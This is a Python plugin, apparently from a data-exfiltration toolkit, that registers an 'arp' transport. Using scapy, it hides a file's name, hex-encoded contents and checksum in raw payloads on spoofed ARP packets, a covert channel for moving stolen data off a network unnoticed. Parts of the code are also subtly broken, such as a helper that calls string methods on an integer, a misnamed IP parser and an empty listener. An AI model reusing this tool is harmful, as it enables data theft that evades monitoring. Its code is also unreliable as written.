import socket
import struct
import os

from scapy.all import Ether, ARP, RandIP, Raw, sendp, sniff

config = None
app_exfiltrate = None


def send(exfiltrate_file, file):
    target = config['target']
    num_bytes = config['num_bytes']

    app_exfiltrate.log_message('warning', "[!] Registering packet for the file")
    data = "%s" % os.path.basename(exfiltrate_file.file_to_send)

    packet_index = 0
    ether = Ether()
    rand_ip = RandIP()
    arp = ARP(psrc=rand_ip, hwsrc='00:00:00:00:00:00')
    pkt= ether / arp / Raw(load=data)
    sendp(pkt, verbose=0)

    while True:
        packet_index += 1
        data_file = file.read(num_bytes).encode('hex')
        if not data_file:
            break
        # ok("Using {0} as transport method".format(protocol_name))

        app_exfiltrate.log_message('info', "[arp] Sending {0} bytes to {1}".format(len(data), target))
        arp = ARP(psrc=rand_ip, hwsrc=int_to_mac(packet_index))
        pkt = ether / arp / Raw(load=data_file)
        sendp(pkt, verbose=0)

    data = "DONE:%s" % exfiltrate_file.checksum
    arp = ARP(psrc=rand_ip, hwsrc=int_to_mac(packet_index))
    pkt = ether / arp / Raw(load=data)
    sendp(pkt, verbose=0)


def int_to_mac(number):
    return int(number.translate(None, ":.- "), 16)


def listen():
    pass


def mac_to_int(ip):
    packedIP = socket.inet_aton(ip)
    return struct.unpack("!L", packedIP)[0]


class Plugin:
    def __init__(self, app, conf):
        global config
        global app_exfiltrate
        config = conf
        app_exfiltrate = app
        app.register_protocol('arp', {'send': send, 'listen': listen})
